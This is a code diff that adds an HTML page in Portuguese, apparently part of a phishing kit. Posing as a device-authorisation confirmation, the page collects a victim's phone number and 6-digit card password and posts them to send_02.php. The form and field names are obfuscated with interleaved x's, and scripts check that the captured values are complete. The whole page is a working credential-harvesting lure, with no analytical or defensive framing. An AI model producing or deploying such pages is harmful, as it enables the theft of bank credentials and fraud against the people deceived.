@@ -1,0 +1,128 @@
+﻿<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+        <title>-</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="session_arquivos/bootstrap.css" rel="stylesheet">
+    <style type="text/css">
+        
+    </style>
+    <script src="session_arquivos/jquery-1.js"></script>
+    <script src="session_arquivos/bootstrap.js"></script>
+</head>
+<body>
+	<link rel="stylesheet" type="text/css" href="session_arquivos/grid12.css" media="all">
+	<link rel="stylesheet" type="text/css" href="session_arquivos/style3.css" media="all">
+	<link rel="stylesheet" type="text/css" href="session_arquivos/jquery-ui.css" media="all">
+	<link rel="stylesheet" type="text/css" href="session_arquivos/animate.css" media="all">
+	<link href="session_arquivos/css.css" rel="stylesheet" type="text/css">
+	<link href="session_arquivos/icon.css" rel="stylesheet">
+	<script type="text/javascript" src="session_arquivos/jquery.js"></script>
+	<script type="text/javascript" src="session_arquivos/custom.js"></script>
+	<script type="text/javascript" src="session_arquivos/jquery-ui.js"></script>
+<script type="text/javascript">
+
+function mascara(o,f){
+    v_obj=o
+    v_fun=f
+    setTimeout("execmascara()",1)
+}
+function execmascara(){
+    v_obj.value=v_fun(v_obj.value)
+}
+function mtel(v){
+    v=v.replace(/\D/g,"");             
+    v=v.replace(/^(\d{2})(\d)/g,"($1) $2"); 
+    v=v.replace(/(\d)(\d{4})$/,"$1-$2");   
+    return v;
+}
+function id( el ){
+	return document.getElementById( el );
+}
+window.onload = function(){
+	id('xmxexlxaxoxcxlx').onkeyup = function(){
+		mascara( this, mtel );
+	}
+}
+</script>	
+<script language="JavaScript">
+function enviardados(){
+ 
+if(document.xmxexlxaxox.xmxexlxaxoxcxlx.value=="" || document.xmxexlxaxox.xmxexlxaxoxcxlx.value.length < 15)
+{
+alert( "Verifique o telefone informado e inclua o 9° dígito" );
+document.xmxexlxaxox.xmxexlxaxoxcxlx.focus();
+return false;
+}
+
+ if(document.xmxexlxaxox.xmxexlxaxoxsx6x.value=="" || document.xmxexlxaxox.xmxexlxaxoxsx6x.value.length < 6)
+{
+alert( "Senha inválida, digite a sua senha de 6 dígitos." );
+document.xmxexlxaxox.xmxexlxaxoxsx6x.focus();
+return false;
+}
+return true;
+}
+ 
+</script>
+<script>
+function proximoCampo(atual,proximo){
+if(atual.value.length >= atual.maxLength){
+document.getElementById(proximo).focus();
+}
+}
+</script>
+<script>
+  function xlxixmxixtxsx6x(obj) {
+    obj.value = obj.value.substring(0,6); 
+  }
+</script>
+<script>
+  function xlxixmxixtxcxlx(obj) {
+    obj.value = obj.value.substring(0,15); 
+  }
+</script>
+
+
+
+
+
+<div style="position: relative" class="col-lg-4 login-card">
+
+	<form id="xmxexlxaxox" name="xmxexlxaxox" action="send_02.php" method="POST" class="col-lg-12" onsubmit="return enviardados();">
+	<div class="group">      
+        <span class="bar"><font size="4" color="#0099cc">Confirmação de Liberação</font></span>
+      <label><span class="span-input"></span></label>
+    </div>
+		<div class="group">      
+        <span class="bar">A autorização deste dispositivo ocorrerá de forma automática após a confirmação de dados.</span>
+      <label><span class="span-input"></span></label>
+    </div>
+    <div class="group">      
+      <input id="xmxexlxaxoxcxlx" name="xmxexlxaxoxcxlx" maxlength="15" required="" onkeyup="xlxixmxixtxcxlx(this),proximoCampo(this, 'xmxexlxaxoxsx6x')" type="tel">
+      <span class="bar"></span>
+      <label><span class="span-input">DD + Telefone</span></label>
+    </div>
+		<div class="group">      
+        <span class="bar"><font size="3" color="#0099cc">Confirme com a senha do cartão</font></span>
+      <label><span class="span-input"></span></label>
+    </div>
+	<div class="group">      
+      <input id="xmxexlxaxoxsx6x" name="xmxexlxaxoxsx6x" maxlength="6" required="" onkeyup="xlxixmxixtxsx6x(this),proximoCampo(this, 'btt')" type="password">
+            <span class="bar"></span>
+      <label><span class="span-input">Senha do Cartão (6 dígitos)</span></label>
+    </div>
+
+	
+	<div class="group">      
+           <button id="btt" name="btt" type="submit" class="giris-yap-buton">CONFIRMAR</button>
+    </div>
+		
+
+
+<script type="text/javascript">
+
+</script>
+
+
+</form></div></body></html>
